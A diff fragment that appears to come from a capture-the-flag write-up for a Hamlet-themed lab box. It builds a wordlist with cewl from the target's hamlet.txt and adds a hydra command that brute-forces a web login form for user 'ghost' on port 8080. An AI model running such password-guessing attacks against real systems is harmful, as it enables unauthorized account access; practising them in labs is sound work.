@@ -351,6 +351,9 @@ GET GUTINDEX.ALL [to get a listing of ALL books]
 :~# apt install cewl
 ...
 :~# cewl -m 12 -w wordlist.txt --lowercase http://TargetIP/hamlet.txt
+...
+:~#  hydra -V -l ghost -P wordlist.txt TargetIP -s 8080 http-post-form -m “/login.html?-1.-loginForm:urlfragment=&username=^USER^&password=^PASS^&Login= Login:’Login failed'”
+...
 ```
 
 <br>
